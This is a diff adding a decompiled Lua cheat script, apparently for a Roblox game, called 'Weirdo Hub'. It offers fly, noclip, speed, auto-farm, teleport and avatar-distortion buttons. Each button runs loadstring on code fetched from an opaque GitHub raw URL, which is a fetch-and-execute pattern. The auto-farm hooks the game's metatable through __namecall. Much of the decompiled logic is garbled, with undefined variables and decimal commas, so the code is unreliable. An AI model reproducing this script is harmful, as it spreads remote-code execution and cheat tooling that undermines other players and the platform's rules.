@@ -1,0 +1,3679 @@
+
+
+--[[
+ ___          ___    ___ ___  ___  ________  ________  ___  __       
+|\  \        |\  \  /  /|\  \|\  \|\   __  \|\   __  \|\  \|\  \     
+\ \  \       \ \  \/  / | \  \\\  \ \  \|\  \ \  \|\  \ \  \/  /|_   
+ \ \  \       \ \    / / \ \   __  \ \  \\\  \ \  \\\  \ \   ___  \  
+  \ \  \____   /     \/   \ \  \ \  \ \  \\\  \ \  \\\  \ \  \\ \  \ 
+   \ \_______\/  /\   \    \ \__\ \__\ \_______\ \_______\ \__\\ \__\
+    \|_______/__/ /\ __\    \|__|\|__|\|_______|\|_______|\|__| \|__|
+             |__|/ \|__|       
+WIREDO HUB - LXYO WAS HERE DISCORD : Crystal Central#0002                                                                                                                                                                        
+--]]
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Force Reset", function(a, b)
+  for fd, fe in a(b, b(b)) do
+    if fe:IsA("BasePart") then
+      fe:Destroy()
+    end
+  end
+end)
+FLYMODE = "Default"
+FLYSPEED = 20
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Fly ( X )", function(a, b, c)
+  a = a
+  a = FLYMODE
+  if a == "Default" then
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    b = a.Character
+    c = b
+    b = b.FindFirstChildWhichIsA
+    b = b(c, "Humanoid")
+    c = a.GetMouse
+    c = c(a)
+    localplayer = a
+    if workspace:FindFirstChild("Core") then
+      workspace.Core:Destroy()
+    end
+    Instance.new("Part").Name = "Core"
+    Instance.new("Part").Size = Vector3.new(0,05, 0,05, 0,05)
+    spawn(function(a)
+      a = a
+      a = va
+      a.Parent = workspace
+      a = Instance
+      a = a.new
+      a = a("Weld", va)
+      a.Part0 = va
+      a.Part1 = localplayer.Character.LowerTorso
+      a.C0 = CFrame.new(0, 0, 0)
+    end)
+    workspace:WaitForChild("Core")
+    flying = true
+    (function(a, b)
+      a = a
+      a = Instance
+      a = a.new
+      b = "BodyPosition"
+      a = a(b, va)
+      b = Instance
+      b = b.new
+      b = b("BodyGyro", va)
+      a.Name = "EPIXPOS"
+      a.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+      a.position = va.Position
+      b.maxTorque = Vector3.new(15000000000000000, 15000000000000000, 15000000000000000)
+      b.cframe = va.CFrame
+      repeat
+        wait()
+        vb.PlatformStand = true
+        if not vc.w and not vc.s and not vc.a and not vc.d then
+          vd = FLYSPEED
+        end
+        if vc.w then
+          vd = vd
+        end
+        if vc.s then
+          vd = vd
+        end
+        if vc.d then
+          vd = vd
+        end
+        if vc.a then
+          vd = vd
+        end
+        if vd > FLYSPEED then
+          vd = FLYSPEED
+        end
+        a.position = (b.cframe - b.cframe.p + a.position + workspace.CurrentCamera.CoordinateFrame.lookVector * vd - workspace.CurrentCamera.CoordinateFrame.lookVector * vd) * CFrame.new(vd, 0, 0) * CFrame.new(-vd, 0, 0).p
+        if vc.w then
+          b.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(vd), 0, 0)
+        elseif vc.s then
+          b.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(vd), 0, 0)
+        else
+          b.cframe = workspace.CurrentCamera.CoordinateFrame
+        end
+      until flying == false
+      if b then
+        b:Destroy()
+      end
+      if a then
+        a:Destroy()
+      end
+      flying = false
+      vb.PlatformStand = false
+      vd = FLYSPEED
+    end)()
+  else
+    repeat
+      repeat
+        repeat
+          repeat
+            a = wait
+            a()
+            a = game
+            a = a.Players
+            a = a.LocalPlayer
+          until a
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+        until a
+        a = game
+        a = a.Players
+        a = a.LocalPlayer
+        a = a.Character
+        b = a
+        a = a.findFirstChild
+        c = "Head"
+        a = a(b, c)
+      until a
+      a = game
+      a = a.Players
+      a = a.LocalPlayer
+      a = a.Character
+      b = a
+      a = a.FindFirstChildWhichIsA
+      c = "Humanoid"
+      a = a(b, c)
+    until a
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    b = a
+    a = a.GetMouse
+    a = a(b)
+    repeat
+      b = wait
+      b()
+    until a
+    b = game
+    b = b.Players
+    b = b.LocalPlayer
+    c = b.Character
+    c = c.Head
+    function Fly(a, b, c, d, e)
+      a = a
+      a = Instance
+      a = a.new
+      b = "BodyGyro"
+      c = va
+      a = a(b, c)
+      a.P = 90000
+      b = Vector3
+      b = b.new
+      c = 9000000000
+      d = 9000000000
+      e = 9000000000
+      b = b(c, d, e)
+      a.maxTorque = b
+      b = va
+      b = b.CFrame
+      a.cframe = b
+      b = Instance
+      b = b.new
+      c = "BodyVelocity"
+      d = va
+      b = b(c, d)
+      c = Vector3
+      c = c.new
+      d = 0
+      e = 0,1
+      c = c(d, e, 0)
+      b.velocity = c
+      c = Vector3
+      c = c.new
+      d = 9000000000
+      e = 9000000000
+      c = c(d, e, 9000000000)
+      b.maxForce = c
+      repeat
+        c = wait
+        c()
+        c = vb
+        c = c.Character
+        d = c
+        c = c.FindFirstChildWhichIsA
+        e = "Humanoid"
+        c = c(d, e)
+        c.PlatformStand = true
+        c = vc
+        c = c.l
+        d = vc
+        d = d.r
+        c = c + d
+        if c == 100000 then
+          c = vc
+          c = c.f
+          d = vc
+          d = d.b
+          c = c + d
+        end
+        if c ~= 10000 then
+          c = vd
+          c = c + 0
+          d = vd
+          e = ve
+          d = d / e
+          c = c + d
+          vd = c
+          c = vd
+          d = ve
+          if c > d then
+            c = ve
+            vd = c
+          end
+        else
+          c = vc
+          c = c.l
+          d = vc
+          d = d.r
+          c = c + d
+          if c == 5 then
+            c = vc
+            c = c.f
+            d = vc
+            d = d.b
+            c = c + d
+            if c == 5 then
+              c = vd
+              if c ~= 5 then
+                c = vd
+                c = c - 5
+                vd = c
+                c = vd
+                if c > 5 then
+                  c = -2
+                  vd = c
+                end
+              end
+            end
+          end
+        end
+        c = vc
+        c = c.l
+        d = vc
+        d = d.r
+        c = c + d
+        if c == 5 then
+          c = vc
+          c = c.f
+          d = vc
+          d = d.b
+          c = c + d
+        end
+        if c ~= 5 then
+          c = game
+          c = c.Workspace
+          c = c.CurrentCamera
+          c = c.CoordinateFrame
+          c = c.lookVector
+          d = vc
+          d = d.f
+          e = vc
+          e = e.b
+          d = d + e
+          c = c * d
+          d = game
+          d = d.Workspace
+          d = d.CurrentCamera
+          d = d.CoordinateFrame
+          e = CFrame
+          e = e.new
+          e = e(vc.l + vc.r, (vc.f + vc.b) * 0,2, 0)
+          e = e.p
+          d = d * e
+          e = game
+          e = e.Workspace
+          e = e.CurrentCamera
+          e = e.CoordinateFrame
+          e = e.p
+          d = d - e
+          c = c + d
+          d = vd
+          c = c * d
+          b.velocity = c
+          c = {}
+          d = vc
+          d = d.f
+          c.f = d
+          d = vc
+          d = d.b
+          c.b = d
+          d = vc
+          d = d.l
+          c.l = d
+          d = vc
+          d = d.r
+          c.r = d
+          vg = c
+        else
+          c = vc
+          c = c.l
+          d = vc
+          d = d.r
+          c = c + d
+          if c == 5 then
+            c = vc
+            c = c.f
+            d = vc
+            d = d.b
+            c = c + d
+            if c == 5 then
+              c = vd
+              if c ~= 5 then
+                c = game
+                c = c.Workspace
+                c = c.CurrentCamera
+                c = c.CoordinateFrame
+                c = c.lookVector
+                d = vg
+                d = d.f
+                e = vg
+                e = e.b
+                d = d + e
+                c = c * d
+                d = game
+                d = d.Workspace
+                d = d.CurrentCamera
+                d = d.CoordinateFrame
+                e = CFrame
+                e = e.new
+                e = e(vg.l + vg.r, (vg.f + vg.b) * 0,2, 0)
+                e = e.p
+                d = d * e
+                e = game
+                e = e.Workspace
+                e = e.CurrentCamera
+                e = e.CoordinateFrame
+                e = e.p
+                d = d - e
+                c = c + d
+                d = vd
+                c = c * d
+                b.velocity = c
+              end
+            end
+          else
+            c = Vector3
+            c = c.new
+            d = 0
+            e = 0,1
+            c = c(d, e, 0)
+            b.velocity = c
+          end
+        end
+        c = game
+        c = c.Workspace
+        c = c.CurrentCamera
+        c = c.CoordinateFrame
+        d = CFrame
+        d = d.Angles
+        e = math
+        e = e.rad
+        e = e((vc.f + vc.b) * 50 * vd / ve)
+        e = -e
+        d = d(e, 0, 0)
+        c = c * d
+        a.cframe = c
+        c = vh
+      until not c
+      c = {}
+      c.f = 0
+      c.b = 0
+      c.l = 0
+      c.r = 0
+      vc = c
+      c = {}
+      c.f = 0
+      c.b = 0
+      c.l = 0
+      c.r = 0
+      vg = c
+      c = 5
+      vd = c
+      d = a
+      c = a.Destroy
+      c(d)
+      d = b
+      c = b.Destroy
+      c(d)
+      c = vb
+      c = c.Character
+      d = c
+      c = c.FindFirstChildWhichIsA
+      e = "Humanoid"
+      c = c(d, e)
+      c.PlatformStand = false
+    end
+    a.KeyDown:connect(function(a)
+      a = a
+      if a:lower() == "x" then
+        if va then
+          va = false
+        else
+          va = true
+          Fly()
+        end
+      elseif a:lower() == "w" then
+        vb.f = FLYSPEED
+      elseif a:lower() == "s" then
+        vb.b = -FLYSPEED
+      elseif a:lower() == "a" then
+        vb.l = -FLYSPEED
+      elseif a:lower() == "d" then
+        vb.r = FLYSPEED
+      end
+    end)
+    a.KeyUp:connect(function(a)
+      a = a
+      if a:lower() == "w" then
+        va.f = 0
+      elseif a:lower() == "s" then
+        va.b = 0
+      elseif a:lower() == "a" then
+        va.l = 0
+      elseif a:lower() == "d" then
+        va.r = 0
+      end
+    end)
+    Fly()
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Fly Type", function(a, b, c, d)
+  a = a
+  a = FLYMODE
+  if a == "Default" then
+    a = "IY"
+    FLYMODE = a
+    a = game
+    a = a.StarterGui
+    b = a
+    a = a.SetCore
+    c = "SendNotification"
+    d = {}
+    d.Title = ""
+    d.Text = "Fly ( Glitchy ) / Reset To Change."
+    d.Duration = 2
+    a(b, c, d)
+  else
+    a = "Default"
+    FLYMODE = a
+    a = game
+    a = a.StarterGui
+    b = a
+    a = a.SetCore
+    c = "SendNotification"
+    d = {}
+    d.Title = "Weirdo Hub; x Venus"
+    d.Text = "Default Fly / Reset To Change."
+    d.Duration = 2
+    a(b, c, d)
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Fly Speed [+]", function(a, b, c, d, e)
+  a = a
+  a = FLYSPEED
+  a = a + 1
+  FLYSPEED = a
+  a = game
+  a = a.StarterGui
+  b = a
+  a = a.SetCore
+  c = "SendNotification"
+  d = {}
+  d.Title = "Weirdo Hub;"
+  e = " [+] The Fly Speed Is Now, "
+  e = e .. tostring(FLYSPEED) .. "."
+  d.Text = e
+  d.Duration = 1
+  a(b, c, d)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Fly Speed [-]", function(a, b, c, d, e, g)
+  a = a
+  a = FLYSPEED
+  a = a - 1
+  FLYSPEED = a
+  a = game
+  a = a.StarterGui
+  b = a
+  a = a.SetCore
+  c = "SendNotification"
+  d = {}
+  d.Title = "Weirdo Hub;"
+  e = " [-] The Fly Speed Is Now, "
+  g = tostring
+  g = g(FLYSPEED)
+  e = e .. g .. "."
+  d.Text = e
+  d.Duration = 1
+  a(b, c, d)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("SuperHuman (Z)", function(a, b, c, d, e, g, h)
+  a = a
+  a = false
+  superhuman = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  b = a
+  a = a.GetMouse
+  a = a(b)
+  mouse = a
+  a = mouse
+  a = a.KeyDown
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    if a == "z" and superhuman == false then
+      superhuman = true
+      game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
+      game.Players.LocalPlayer.Character.Humz.WalkSpeed = 150
+      game.Players.LocalPlayer.Character.Humz.JumpPower = 250
+    elseif a == "z" and superhuman == true then
+      superhuman = false
+      game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
+      game.Players.LocalPlayer.Character.Humz.JumpPower = 50
+      game.Players.LocalPlayer.Character.Humz.Name = "Humanoid"
+    end
+  end
+  a(b, c)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Editable SuperHuman ( Y )", function(a, b, c, d, e, g, h, j)
+  a = a
+  a = false
+  superhumann = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  b = a
+  a = a.GetMouse
+  a = a(b)
+  mouse = a
+  a = mouse
+  a = a.KeyDown
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    if a == "y" and superhumann == false then
+      superhumann = true
+      game.Players.LocalPlayer.Character.Humanoid.Name = "Slider"
+      game.Players.LocalPlayer.Character.Slider.WalkSpeed = 16
+      game.Players.LocalPlayer.Character.Slider.JumpPower = 50
+    elseif a == "y" and superhumann == true then
+      superhumann = false
+      game.Players.LocalPlayer.Character.Slider.WalkSpeed = 16
+      game.Players.LocalPlayer.Character.Slider.JumpPower = 50
+      game.Players.LocalPlayer.Character.Slider.Name = "Humanoid"
+    end
+  end
+  a(b, c)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddSlider("Editable SuperHuman / WalkSpeed", {
+  Min = 0,
+  Max = 500,
+  Def = 16
+}, function(a)
+  a = a
+  game.Players.LocalPlayer.Character.Slider.WalkSpeed = a
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddSlider("Editable SuperHuman / JumpPower", {
+  Min = 0,
+  Max = 1000,
+  Def = 50
+}, function(a)
+  a = a
+  game.Players.LocalPlayer.Character.Slider.JumpPower = a
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Fake Macro ( B )", function(a, b, c, d, e, g, h, j, k, l, m)
+  a = a
+  a = false
+  speedgli = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  b = a
+  a = a.GetMouse
+  a = a(b)
+  mouse = a
+  a = mouse
+  a = a.KeyDown
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    if a == "b" and speedgli == false then
+      speedgli = true
+      game.Players.LocalPlayer.Character.Humanoid.Name = "Humzz"
+      game.Players.LocalPlayer.Character.Humzz.WalkSpeed = 300
+    elseif a == "b" and speedgli == true then
+      speedgli = false
+      game.Players.LocalPlayer.Character.Humzz.WalkSpeed = 16
+      game.Players.LocalPlayer.Character.Humzz.Name = "Humanoid"
+    end
+  end
+  a(b, c)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Noclip ( C )", function(a, b, c, d, e, g, h, j, k, l, m, o)
+  a = a
+  a = false
+  noclip = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "RunService"
+  a = a(b, c)
+  a = a.Stepped
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    a = noclip
+    if a then
+      a = game
+      a = a.Players
+      a = a.LocalPlayer
+      a = a.Character
+      a = a.Humanoid
+      a = a.ChangeState
+      a(a, 11)
+    end
+  end
+  a(b, c)
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  plr = a
+  a = plr
+  b = a
+  a = a.GetMouse
+  a = a(b)
+  mouse = a
+  a = mouse
+  a = a.KeyDown
+  b = a
+  a = a.connect
+  function c(a)
+    a = a
+    if a == "c" then
+      noclip = not noclip
+      game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+    end
+  end
+  a(b, c)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Ground Tools", function(a, b, c, d, e, g, h, j, k, l, m, o, p)
+  d = "Workspace"
+  p = b(c)
+  for d, e in a(b, c, d, e, g, h, j, k, l, m, o, p) do
+    g = va
+    g = g.Character
+    g = g.HumanoidRootPart
+    h = e.CFrame
+    g.CFrame = h
+    g = wait
+    h = 0,01
+    g(h)
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("AutoFarm ( Working )", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n)
+  a = a
+  repeat
+    a = wait
+    a()
+    a = game
+    b = a
+    a = a.IsLoaded
+    a = a(b)
+  until a
+  a = getrawmetatable
+  b = game
+  a = a(b)
+  b = setreadonly
+  c = a
+  b(c, d)
+  b = a.__namecall
+  c = newcclosure
+  c = c(d)
+  a.__namecall = c
+  c = game
+  c = c.GetService
+  c = c(d, e)
+  c = c.LocalPlayer
+  gettarget = d
+  n = e(g)
+  for h, j in d(e, g, h, j, k, l, m, o, p, n) do
+    l = j
+    k = j.IsA
+    m = "Seat"
+    k = k(l, m)
+    if k then
+      l = j
+      k = j.Destroy
+      k(l)
+    end
+  end
+  d.MoneyFarm = true
+  while true do
+    if d then
+      d()
+      repeat
+        e()
+        e(g)
+        if d then
+        end
+      until e < 0
+      h = g
+      j = "Workspace"
+      h = g
+      n = g(h)
+      h = e(g, h, j, k, l, m, o, p, n)
+      do return end
+      while true do
+        m = k
+        l = k.IsA
+        o = "ClickDetector"
+        l = l(m, o)
+        if l then
+          l = k.Parent
+          if l then
+            l = k.Parent
+            l = l.Name
+            m = l
+            l = l.find
+            o = "Money"
+            l = l(m, o)
+            if l then
+              l = c.Character
+              if not l then
+                l = c.CharacterAdded
+                m = l
+                l = l.wait
+                l = l(m)
+              end
+              o = l
+              m = l.WaitForChild
+              p = "HumanoidRootPart"
+              m = m(o, p)
+              o = k.Parent
+              o = o.Position
+              p = m.Position
+              o = o - p
+              o = o.magnitude
+              repeat
+                if o <= 18 then
+                  o = wait
+                  o()
+                  o = fireclickdetector
+                  p = k
+                  o(p)
+                  if k then
+                    o = k.Parent
+                    o = o.Parent
+                  end
+                end
+              until not o
+            end
+          end
+        end
+      end
+      e(g)
+    end
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Anti Slow", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r)
+  a = a
+  a = true
+  antislow = a
+  repeat
+    a = wait
+    b = 0,1
+    a(b)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    b = a.Character
+    b = b.BodyEffects
+    b = b.Movement
+    c = b
+    b = b.FindFirstChild
+    d = "NoJumping"
+    b = b(c, d)
+    if not b then
+      b = a.Character
+      b = b.BodyEffects
+      b = b.Movement
+      c = b
+      b = b.FindFirstChild
+      d = "ReduceWalk"
+      b = b(c, d)
+      if not b then
+        b = a.Character
+        b = b.BodyEffects
+        b = b.Movement
+        c = b
+        b = b.FindFirstChild
+        d = "NoWalkSpeed"
+        b = b(c, d)
+      end
+    end
+    if b then
+      d = b
+      c = b.Destroy
+      c(d)
+    end
+    c = a.Character
+    c = c.BodyEffects
+    c = c.Reload
+    c = c.Value
+    if c == true then
+      c = a.Character
+      c = c.BodyEffects
+      c = c.Reload
+      c.Value = false
+    end
+    c = antislow
+  until c == false
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Mask", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  b = a.Character
+  c = b
+  b = b.FindFirstChild
+  d = "In-gameMask"
+  b = b(c, d)
+  c = a.Character
+  d = c
+  c = c.FindFirstChildWhichIsA
+  e = "Humanoid"
+  c = c(d, e)
+  if not b then
+    d = a.Character
+    e = d
+    d = d.FindFirstChild
+    g = "Mask"
+    d = d(e, g)
+    if not d then
+      d = a.Backpack
+      e = d
+      d = d.FindFirstChild
+      g = "Mask"
+      d = d(e, g)
+    end
+    if d then
+      e = a.Backpack
+      g = e
+      e = e.FindFirstChild
+      h = "Mask"
+      e = e(g, h)
+      if e then
+        h = c
+        g = c.EquipTool
+        j = e
+        g(h, j)
+        g = wait
+        h = 0,1
+        g(h)
+      end
+      h = d
+      g = d.Activate
+      g(h)
+    else
+      e = "Mask"
+      g = 60
+      h = game
+      j = h
+      h = h.GetService
+      k = "Workspace"
+      h = h(j, k)
+      h = h.Ignored
+      h = h.Shop
+      h = h["[Paintball Mask] - $60"]
+      h = h.ClickDetector
+      j = game
+      k = j
+      j = j.GetService
+      l = "Workspace"
+      j = j(k, l)
+      j = j.Ignored
+      j = j.Shop
+      j = j["[Paintball Mask] - $60"]
+      j = j.Head
+      j = j.Position
+      function k(a)
+        a = a
+        a = wait
+        a()
+        a = va
+        a = a.Character
+        a = a.HumanoidRootPart
+        a.CFrame = CFrame.new(vb)
+        a = fireclickdetector
+        a(vc)
+        a = va
+        a = a.Character
+        a = a.LeftHand
+        a = a.FindFirstChild
+        a = a(a, "LeftWrist")
+        if not a then
+          a = va
+          a = a.Character
+          a = a.LeftHand
+          a.Position = va.Character.LeftLowerArm.Position
+          a = va
+          a = a.Character
+          a = a.RightHand
+          a.Position = va.Character.RightLowerArm.Position
+        end
+      end
+      repeat
+        l = k
+        l()
+        l = a.Backpack
+        m = l
+        l = l.FindFirstChild
+        o = e
+        l = l(m, o)
+        if not l then
+          l = a.DataFolder
+          l = l.Currency
+          l = l.Value
+          if not (g > l) then
+            l = a.Character
+            m = l
+            l = l.FindFirstChild
+            o = e
+            l = l(m, o)
+          end
+        end
+      until l
+      l = a.Character
+      l = l.HumanoidRootPart
+      m = NamePos
+      l.CFrame = m
+      l = a.Character
+      l = l.LeftHand
+      m = l
+      l = l.FindFirstChild
+      o = "LeftWrist"
+      l = l(m, o)
+      if not l then
+        l = a.Character
+        l = l.LeftHand
+        m = a.Character
+        m = m.LeftLowerArm
+        m = m.Position
+        l.Position = m
+        l = a.Character
+        l = l.RightHand
+        m = a.Character
+        m = m.RightLowerArm
+        m = m.Position
+        l.Position = m
+      end
+    end
+  else
+    d = a.Character
+    e = d
+    d = d.FindFirstChild
+    g = "In-gameMask"
+    d = d(e, g)
+    e = d
+    d = d.FindFirstChild
+    g = "Handle"
+    d = d(e, g)
+    if d then
+      g = d
+      e = d.Destroy
+      e(g)
+    end
+  end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Player").AddButton("Anonymous", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t)
+  a = a
+  a = pcall
+  function b(a)
+    a = a
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Shirt
+    a = a.Destroy
+    a(a)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.RightUpperLeg
+    a = a.Destroy
+    a(a)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Humanoid
+    a.HealthDisplayDistance = math.huge
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Humanoid
+    a.NameDisplayDistance = math.huge
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.RightUpperLeg
+    a.Size = Vector3.new(0, 0, 0)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.RightUpperLeg
+    a.Massless = true
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.RightUpperLeg
+    a.CanCollide = false
+    a = true
+    asdasd = a
+    while true do
+      a = asdasd
+      if a == true then
+        a = pcall
+        a(function(a)
+          a = a
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.RightUpperLeg
+          a = a.RightHipRigAttachment
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.RightUpperLeg
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+        end)
+        a = wait
+        a()
+      end
+    end
+  end
+  a(b)
+  a = wait
+  b = 0,1
+  a(b)
+  a = pcall
+  function b(a, b)
+    a = a
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.LeftUpperLeg
+    b = a
+    a = a.Destroy
+    a(b)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Pants
+    b = a
+    a = a.Destroy
+    a(b)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Humanoid
+    b = math
+    b = b.huge
+    a.HealthDisplayDistance = b
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Humanoid
+    b = math
+    b = b.huge
+    a.NameDisplayDistance = b
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.LeftUpperLeg
+    b = Vector3
+    b = b.new
+    b = b(0, 0, 0)
+    a.Size = b
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.LeftUpperLeg
+    a.Massless = true
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.LeftUpperLeg
+    a.CanCollide = false
+    a = true
+    asdasd = a
+    while true do
+      a = asdasd
+      if a == true then
+        a = pcall
+        function b(a)
+          a = a
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.LeftUpperLeg
+          a = a.LeftHipRigAttachment
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.LeftUpperLeg
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+        end
+        a(b)
+        a = wait
+        a()
+      end
+    end
+  end
+  a(b)
+  a = wait
+  b = 0,1
+  a(b)
+  a = pcall
+  function b(a, b, c)
+    a = a
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Head
+    a = a.Neck
+    b = a
+    a = a.Destroy
+    a(b)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.UpperTorso
+    a = a.NeckAttachment
+    b = a
+    a = a.Destroy
+    a(b)
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Humanoid
+    b = math
+    b = b.huge
+    a.HealthDisplayDistance = b
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Humanoid
+    b = math
+    b = b.huge
+    a.NameDisplayDistance = b
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Head
+    b = Vector3
+    b = b.new
+    c = 0
+    b = b(c, 0, 0)
+    a.Size = b
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Head
+    a.Massless = true
+    a = game
+    a = a.Players
+    a = a.LocalPlayer
+    a = a.Character
+    a = a.Head
+    a.CanCollide = false
+    a = true
+    asdasd = a
+    while true do
+      a = asdasd
+      if a == true then
+        a = pcall
+        function b(a)
+          a = a
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.Head
+          a = a.NeckRigAttachment
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.UpperTorso
+          a = a.NeckRigAttachment
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+          a = game
+          a = a.Players
+          a = a.LocalPlayer
+          a = a.Character
+          a = a.Head
+          a.CFrame = CFrame.new(0, 100000,473632813, 0)
+        end
+        a(b)
+        a = wait
+        a()
+      end
+    end
+  end
+  a(b)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddLabel("Waypoints")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Teleports").AddButton("Admin Base", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u)
+  a = a
+  a = game
+  b = a
+  a = a.GetService
+  c = "Players"
+  a = a(b, c)
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.HumanoidRootPart
+  b = CFrame
+  b = b.new
+  c = -729,89501953125
+  d = -39,654216766357
+  e = -885,79998779297
+  b = b(c, d, e)
+  a.CFrame = b
+end)
